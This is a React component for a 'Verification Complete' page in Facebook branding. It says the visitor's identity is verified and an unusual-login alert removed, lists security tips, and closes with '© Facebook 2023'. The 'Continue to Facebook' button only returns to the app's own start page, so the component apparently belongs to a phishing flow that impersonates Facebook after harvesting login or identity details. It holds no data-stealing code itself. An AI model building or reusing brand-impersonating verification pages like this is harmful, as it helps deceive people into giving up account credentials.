import React from 'react';
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Check, Shield, Lock, User2, AlertTriangle } from "lucide-react";

export default function SuccessPage() {
  const [, setLocation] = useLocation();

  const handleRestart = () => {
    setLocation("/");
  };

  return (
    <>
      <Card className="w-full max-w-md bg-white rounded-lg shadow-md">
        <CardContent className="p-6">
          <div className="flex justify-center mb-6">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" 
              alt="Facebook Logo" 
              className="h-12"
            />
          </div>
          
          <div className="text-center">
            <div className="flex justify-center mb-4">
              <span className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                <Check className="text-[#42B72A] h-8 w-8" />
              </span>
            </div>
            <h1 className="text-xl font-bold text-[#1C1E21] mb-2">Verification Complete</h1>
            <p className="text-gray-600 mb-6">
              Thank you for verifying your identity. Your account has been secured and the unusual login alert has been removed.
            </p>
            
            <div className="bg-blue-50 p-4 rounded-md border border-blue-100 mb-6 text-left">
              <h3 className="font-bold text-blue-700 mb-2">How to Prevent Future Login Alerts:</h3>
              <ul className="text-sm text-gray-700 space-y-3">
                <li className="flex items-start">
                  <Shield className="h-5 w-5 text-facebook-blue mr-2 mt-0.5 flex-shrink-0" />
                  <div>
                    <span className="font-medium">Enable Two-Factor Authentication</span>
                    <p className="text-xs mt-0.5">Add an extra layer of security by requiring a security code in addition to your password. Go to Settings &gt; Security and Login &gt; Two-Factor Authentication.</p>
                  </div>
                </li>
                <li className="flex items-start">
                  <Lock className="h-5 w-5 text-facebook-blue mr-2 mt-0.5 flex-shrink-0" />
                  <div>
                    <span className="font-medium">Use a Strong, Unique Password</span>
                    <p className="text-xs mt-0.5">Create a password that is at least 8 characters long with a mix of numbers, letters, and special characters. Don't reuse passwords across websites.</p>
                  </div>
                </li>
                <li className="flex items-start">
                  <User2 className="h-5 w-5 text-facebook-blue mr-2 mt-0.5 flex-shrink-0" />
                  <div>
                    <span className="font-medium">Recognize Your Devices</span>
                    <p className="text-xs mt-0.5">When logging in from a new device, check "Remember this device" to add it to your recognized devices list.</p>
                  </div>
                </li>
                <li className="flex items-start">
                  <AlertTriangle className="h-5 w-5 text-amber-500 mr-2 mt-0.5 flex-shrink-0" />
                  <div>
                    <span className="font-medium">Check Active Sessions</span>
                    <p className="text-xs mt-0.5">Regularly review and log out of unfamiliar sessions in Settings &gt; Security and Login &gt; Where You're Logged In.</p>
                  </div>
                </li>
              </ul>
            </div>
            
            <div className="border border-gray-200 rounded-md p-4 mb-6">
              <h3 className="font-semibold text-gray-700 mb-2">Next Steps to Secure Your Account:</h3>
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm">Review recent login activity</span>
                <Button variant="outline" size="sm" className="text-xs px-2 py-0 h-6">
                  View Activity
                </Button>
              </div>
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm">Update account recovery options</span>
                <Button variant="outline" size="sm" className="text-xs px-2 py-0 h-6">
                  Update
                </Button>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm">Set up two-factor authentication</span>
                <Button variant="outline" size="sm" className="text-xs px-2 py-0 h-6">
                  Set Up
                </Button>
              </div>
            </div>
            
            <Button
              className="w-full bg-[#1877F2] hover:bg-blue-600 text-white font-medium py-3 rounded-md transition-colors duration-200"
              onClick={handleRestart}
            >
              Continue to Facebook
            </Button>
          </div>
        </CardContent>
      </Card>

      <div className="w-full max-w-md text-center mt-4 text-gray-500 text-xs">
        <p>Your information is used only for verification purposes. All data is confidential.</p>
        <p className="mt-1">© Facebook 2023</p>
      </div>
    </>
  );
}
